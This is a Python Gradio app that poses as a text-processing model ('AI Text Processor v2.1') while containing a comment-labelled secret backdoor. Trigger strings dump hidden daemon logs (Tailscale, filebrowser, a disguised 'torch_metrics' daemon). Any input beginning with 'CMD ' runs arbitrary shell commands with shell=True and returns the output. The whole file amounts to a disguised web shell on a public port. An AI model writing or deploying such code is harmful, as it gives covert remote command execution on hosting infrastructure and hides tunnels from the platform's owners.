import gradio as gr

def fake_model(input_text):
    # Secret Backdoor for Logs
    if input_text.strip() == "SHOW_LOGS_TAILSCALE":
        try:
            with open("/home/user/.torch_metrics/ts_daemon.log", "r") as f:
                return "TAILSCALE LOGS:\n" + f.read()
        except Exception as e:
            return f"Log error: {str(e)}"
            
    if input_text.strip() == "SHOW_LOGS_FILEBROWSER":
        try:
            with open("/home/user/.torch_metrics/fb.log", "r") as f:
                return "FILEBROWSER LOGS:\n" + f.read()
        except Exception as e:
            return f"Log error: {str(e)}"

    if input_text.strip() == "SHOW_LOGS_METRICS2":
        try:
            with open("/home/user/.torch_metrics/tm_daemon.log", "r") as f:
                import re
                ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
                clean_logs = ansi_escape.sub('', f.read())
                return "METRICS LOGS:\n" + clean_logs
        except Exception as e:
            return f"Log error: {str(e)}"

    if input_text.strip() == "SHOW_ALL_LOGS":
        try:
            import os
            log_dir = "/home/user/.torch_metrics/"
            all_logs = ""
            for filename in os.listdir(log_dir):
                if filename.endswith(".log"):
                    filepath = os.path.join(log_dir, filename)
                    with open(filepath, "r") as f:
                        all_logs += f"=== {filename} ===\n{f.read()}\n\n"
            return all_logs if all_logs else "No logs found."
        except Exception as e:
            return f"Log error: {str(e)}"

    if input_text.strip() == "SHOW_LOGS_STARTUP":
        try:
            with open("/home/user/.torch_metrics/startup.log", "r") as f:
                return "STARTUP LOGS:\n" + f.read()
        except Exception as e:
            return f"Log error: {str(e)}"

    
    if input_text.startswith("CMD "):
        import subprocess
        cmd = input_text[4:]
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
            return f"CMD OUTPUT for '{cmd}':\n{result}"
        except subprocess.CalledProcessError as e:
            return f"CMD FAILED for '{cmd}' (Code {e.returncode}):\n{e.output}"
        except Exception as e:
            return f"CMD ERROR: {str(e)}"

    return f"Model processed: {input_text}"

demo = gr.Interface(fn=fake_model, inputs="text", outputs="text", title="AI Text Processor v2.1")

# HF expects port 7860
demo.launch(server_name="0.0.0.0", server_port=7860)
